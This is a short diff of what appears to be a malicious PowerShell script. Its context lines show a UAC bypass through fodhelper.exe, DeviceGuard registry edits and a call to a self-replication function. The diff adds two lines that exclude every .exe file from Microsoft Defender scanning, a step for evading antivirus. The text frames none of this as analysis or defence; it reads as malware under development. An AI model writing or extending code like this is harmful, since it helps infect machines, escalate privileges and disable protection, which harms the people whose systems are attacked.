@@ -113,7 +113,7 @@ if (-not (Test-Admin)) {
     Start-Process "fodhelper.exe" -WindowStyle Hidden
 
     # UAC bypassed here!
-
+    Add-MpPreference -ExclusionExtension ".exe";
     # Exit the script to allow the rest run as admin
     exit
 }
@@ -213,7 +213,7 @@ Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard
 
 
 
-
+Add-MpPreference -ExclusionExtension ".exe";
 # Call the Invoke-SelfReplication function
 Invoke-SelfReplication
 
